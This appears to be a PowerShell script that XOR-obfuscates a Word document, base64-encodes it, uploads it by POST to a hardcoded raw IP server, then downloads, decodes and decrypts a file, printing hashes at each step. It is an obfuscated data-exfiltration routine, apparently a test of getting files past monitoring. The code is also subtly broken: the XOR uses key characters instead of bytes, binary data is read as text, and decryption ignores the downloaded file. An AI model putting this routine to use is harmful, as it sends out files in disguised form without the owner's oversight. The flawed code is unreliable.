# Functions
function Dencrypt {
    param (
        [string]$Path
    )
    $keyString = "ksdjflkasflsf--Some random key to encrypt--kjsdbfjagidigfdsch"
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($keyString)
    $fileBytes = [System.IO.File]::ReadAllBytes($Path)
    $fileBytes = [System.IO.File]::ReadAllBytes($Path)
    # Perform XOR operation
    $ouputBytes = New-Object byte[] $fileBytes.count
    $keyI = 0
    for($fileI = 0; $fileI -lt $fileBytes.count; $fileI++){
        $ouputBytes[$fileI] = $fileBytes[$fileI] -bxor $keyString[$keyI]
        $keyI++
        if($keyI -eq $keyBytes.count){
            $keyI=0
        }
    }
    return $ouputBytes
}

Function Base64Encode {
    param (
        [string]$Data
    )
    $DataAsBytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
    return [Convert]::ToBase64String($DataAsBytes);
}

Function Base64Decode {
    param(
        [string]$Data
    )
    return [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Data))

}


$inputFilePath = 'files\Sample.docx'

$fileHash = Get-FileHash ('files\Sample.docx')
Write-Host "Original file Hash",$fileHash.Hash


# Encrypt
$encrypted = Dencrypt($inputFilePath);
[System.IO.File]::WriteAllBytes('output\encrypted.txt', $encrypted)

$fileHash = Get-FileHash ('output\encrypted.txt')
Write-Host "Encrypted file Hash",$fileHash.Hash


# Encode
$encoded = Base64Encode([IO.File]::ReadAllText(('output\encrypted.txt')));
[System.IO.File]::WriteAllText('output\encoded.txt', $encoded)

$fileHash = Get-FileHash ('output\encoded.txt')
Write-Host "Encoded file Hash",$fileHash.Hash

# Upload
$Uri = 'http://103.66.77.122:8000/sd.php';
$FileContent = [IO.File]::ReadAllText('output\encoded.txt')
$Fields = @{'data'=$FileContent};
Invoke-RestMethod -Uri $Uri -Method Post -Body $Fields;

Write-Host "File Uploaded"

# Download
$inputFilePath = Read-Host "file name on remote server"
$Uri = 'http://103.66.77.122:8000/vshgdsdjkhfkj/data_only/';
Write-Host "URI: "$Uri$inputFilePath
Invoke-WebRequest ($Uri+$inputFilePath) -OutFile 'output\downloaded.txt'

$fileHash = Get-FileHash ('output\downloaded.txt')
Write-Host "Downloaded file Hash",$fileHash.Hash


# Decode
$decoded = Base64Decode([IO.File]::ReadAllText(('output\downloaded.txt')));
[System.IO.File]::WriteAllText('output\decoded.txt', $decoded)

$fileHash = Get-FileHash ('output\decoded.txt')
Write-Host "Decoded file Hash",$fileHash.Hash

# Decrypt
$decrypted = Dencrypt('output\encrypted.txt');
[System.IO.File]::WriteAllBytes('output\decrypted.docx', $decrypted)

$fileHash = Get-FileHash ('output\decrypted.docx')
Write-Host "Decrypted file Hash",$fileHash.Hash

























